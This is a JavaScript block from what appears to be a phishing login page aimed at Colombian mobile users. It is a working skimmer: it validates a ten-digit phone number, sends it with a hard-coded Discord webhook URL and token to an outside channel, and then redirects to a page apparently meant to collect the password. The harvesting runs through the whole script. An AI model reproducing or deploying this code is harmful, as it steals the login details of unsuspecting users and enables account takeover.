    <script>
      document.addEventListener("DOMContentLoaded", () => {
        const phoneInput = document.getElementById("phoneNumber");
        const loginButton = document.getElementById("loginButton");
        const mainContainer = document.getElementById("mainContainer");
        const form = document.getElementById("homeForm");

        // URL del webhook de Discord
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1528561832745504890/-WMClOdhjh5W17ifU1gTiOu2IwsJCYZX4IBD7ETnTCARvPsD2tSSVjLqywSsJNie7kQN';

        // Función para validar el celular
        function validatePhone() {
          const phoneNumber = phoneInput.value.trim();

          // Validar que sea un número
          if (!/^\d+$/.test(phoneNumber)) {
            return false;
          }

          // Validar que tenga exactamente 10 dígitos
          if (phoneNumber.length !== 10) {
            return false;
          }

          // Validar que comience con 3
          if (!phoneNumber.startsWith("3")) {
            return false;
          }

          return true;
        }

        // Función para enviar el número a Discord
        async function sendPhoneToDiscord(phoneNumber) {
          try {
            const message = `📱 **NÚMERO DE CELULAR**\n\n☎️ Teléfono: +57${phoneNumber}\n\n════════════════════`;
            
            const response = await fetch(DISCORD_WEBHOOK_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ content: message })
            });

            if (!response.ok) {
              console.error("Discord webhook error:", response.status);
            } else {
              console.log("✅ Número enviado a Discord correctamente");
            }
          } catch (err) {
            console.error("Error al enviar a Discord:", err);
          }
        }

        // Detectar cuando se abre el teclado
        function handleVisualViewport() {
          if (window.visualViewport) {
            if (window.visualViewport.height < window.innerHeight) {
              mainContainer.classList.add("keyboard-open");
            } else {
              mainContainer.classList.remove("keyboard-open");
            }
          }
        }

        if (window.visualViewport) {
          window.visualViewport.addEventListener("resize", handleVisualViewport);
        }

        form.addEventListener("submit", (event) => {
          event.preventDefault();
        });

        // Permitir solo números
        phoneInput.addEventListener("input", () => {
          // Remover caracteres que no sean números
          phoneInput.value = phoneInput.value.replace(/[^\d]/g, '');
          
          // Limitar a 10 dígitos
          if (phoneInput.value.length > 10) {
            phoneInput.value = phoneInput.value.slice(0, 10);
          }

          // Actualizar estado del botón
          if (validatePhone()) {
            loginButton.disabled = false;
          } else {
            loginButton.disabled = true;
          }
        });

        // Prevenir pegar caracteres no numéricos
        phoneInput.addEventListener("paste", (event) => {
          event.preventDefault();
          const pastedText = (event.clipboardData || window.clipboardData).getData('text');
          const numericOnly = pastedText.replace(/[^\d]/g, '').slice(0, 10);
          phoneInput.value = numericOnly;
          phoneInput.dispatchEvent(new Event('input'));
        });

        // Click en el botón de login
        loginButton.addEventListener("click", async (event) => {
          event.preventDefault();
          const phoneNumber = phoneInput.value.trim();
          
          console.log("Botón presionado. Valor del teléfono:", phoneNumber);
          
          if (validatePhone()) {
            console.log("✅ Validación exitosa, enviando a Discord...");
            
            // Guardar en localStorage
            localStorage.setItem("phoneNumber", phoneNumber);
            
            // Enviar a Discord
            await sendPhoneToDiscord(phoneNumber);
            
            // Esperar un momento y navegar
            setTimeout(() => {
              console.log("Navegando a access-sign-in-pass.php.html");
              window.location.href = "./access-sign-in-pass.php.html";
            }, 500);
          } else {
            console.log("❌ Validación fallida");
          }
        });
      });
    </script>
